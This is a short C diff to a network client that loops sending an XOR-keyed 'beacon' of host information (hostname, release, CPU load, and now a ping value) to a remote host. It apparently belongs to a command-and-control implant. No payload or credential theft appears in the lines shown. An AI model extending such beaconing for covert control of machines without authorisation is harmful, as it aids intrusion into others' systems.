@@ -59,6 +59,7 @@ bool net_client(char *host, int port){
   sys_hostname(sysinfo.hostname, SYS_HOSTNAME_SIZE);
   sys_release(sysinfo.release, SYS_RELEASE_SIZE);
   sysinfo.cpu_usage = sys_load_average();
+  sysinfo.ping = sys_ping();
   
   while(true){
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -82,7 +83,8 @@ bool net_client(char *host, int port){
       p_net_client_beacon->xor_key = crypt_random_xor_key();
       p_net_client_beacon->sysinfo = sysinfo;
       p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
-      p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
+      p_net_client_beacon->sysinfo.ping = sys_ping();
+      //p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
       if (send(sock_fd, p_net_client_beacon, sizeof(net_client_beacon_t), 0) < 0){
         fprintf(stderr,
                 "[-] failed to send data to %s:%d\n",
